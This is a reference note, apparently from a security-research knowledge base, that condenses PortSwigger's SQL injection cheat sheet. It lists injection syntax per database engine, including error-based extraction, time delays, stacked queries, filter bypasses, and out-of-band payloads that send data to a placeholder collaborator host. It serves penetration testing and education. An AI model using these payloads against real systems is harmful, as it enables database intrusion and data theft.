# DBMS cheat sheet: per-engine syntax for concat, comments, version, errors, stacked queries, time, DNS

- **Vuln type / sub-variant:** reference of DBMS-specific SQLi syntax (MySQL, PostgreSQL, MSSQL, Oracle) for every stage of an attack
- **Target type:** any SQLi where you need the right syntax for the detected engine
- **Recon signal:** a working version/error/delay method identifies the DBMS (methods differ per engine, so a hit fingerprints it)
- **Root cause:** reference, not a vuln
- **Exploitation steps (key per-DBMS syntax):**
  1. Concatenation: Oracle/PostgreSQL `'a'||'b'`, MSSQL `'a'+'b'`, MySQL `CONCAT('a','b')` or space-separated.
  2. Comments: `--`, `/* */` (MySQL also `#`; MySQL `--` needs a trailing space). MySQL versioned comment `/*!SELECT*/` executes.
  3. Version: MSSQL/MySQL `SELECT @@version`; PostgreSQL `version()`; Oracle `v$version`.
  4. Contents: `information_schema.tables`/`.columns` (MySQL/PG/MSSQL); Oracle `all_tables`/`all_tab_columns`.
  5. Conditional error / visible-error leak: MySQL `EXTRACTVALUE(1,CONCAT(0x5c,(SELECT ...)))`; PG `CAST((SELECT ...) AS int)`; MSSQL `1=(SELECT 'secret')`.
  6. Stacked queries: MSSQL/PG/MySQL `q1; q2` (Oracle none; MySQL rarely via PHP/Python APIs); results not returned, used for blind.
  7. Time: MSSQL `WAITFOR DELAY '0:0:10'`; MySQL `SLEEP(10)`; PG `pg_sleep(10)`; Oracle `dbms_pipe.receive_message(('a'),10)`.
  8. DNS/OOB (+ exfil in subdomain): MSSQL `xp_dirtree '//x.<collab>/a'`; PG `copy (SELECT '') to program 'nslookup ...'`; MySQL (Windows) `LOAD_FILE`/`INTO OUTFILE '\\\\<collab>\a'`; Oracle `EXTRACTVALUE(xmltype(...SYSTEM "http://...collab/"))`.
- **Bypasses used:** case variation (`SeLeCT`), inline comments for whitespace (`SELECT/**/FROM`), MySQL versioned comments
- **Impact:** reference enabling every escalation
- **Bounty:** reference
- **Lesson / pattern:** once you know the DBMS, pull the exact concat/comment/version/error/time/DNS syntax from this table; a method that only works on one engine also tells you which engine you are on.
- **Source:**
  - Title: SQL injection cheat sheet
  - Author: PortSwigger Web Security Academy
  - URL: https://portswigger.net/web-security/sql-injection/cheat-sheet
  - Date: reference (scraped 2026-11-19)
  - Raw file: `sources/sqli/04-portswigger-sqli-cheat-sheet.md`

Tags: cheat-sheet, reference, dbms-fingerprint, mysql, postgresql, mssql, oracle, union-concat, conditional-error, extractvalue, stacked-queries, time-based, oob-oast, xp-dirtree, into-outfile, comment-whitespace, versioned-comment, case-variation
